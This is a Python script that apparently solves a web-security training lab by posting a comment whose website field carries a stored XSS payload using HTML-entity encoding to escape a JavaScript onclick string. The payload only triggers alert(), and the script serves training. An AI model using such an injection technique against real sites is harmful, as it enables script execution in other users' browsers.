import requests
import re
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped"

def run(url, payload=None, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch a post page\n2. Extract the session cookie and the csrf token to post a comment\n3. Post a comment with the injected payload in the website field\n""")

    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False

    try:
        # Step 1: Fetch the blog post
        r = session.get(url.rstrip('/') + "/post?postId=1")
        csrf_token = re.search(r'name="csrf" value="(.+?)"', r.text).group(1)

        # Step 2: Post comment with XSS payload
        data = {
            "csrf": csrf_token,
            "postId": "1",
            "name": "mystic_mido",
            "email": "mystic_mido@mystic_mido.com",
            "website": "http://lol.com&apos;);alert();//",
            "comment": "visit my portfolio>"
        }

        response = session.post(url.rstrip('/') + "/post/comment", data=data)
        r = session.get(url.rstrip('/') + "/post?postId=1")
        return "Congratulations, you solved the lab!" in response.text or response.status_code == 200

    except Exception as e:
        print(f"[!] Error: {e}")
        return False
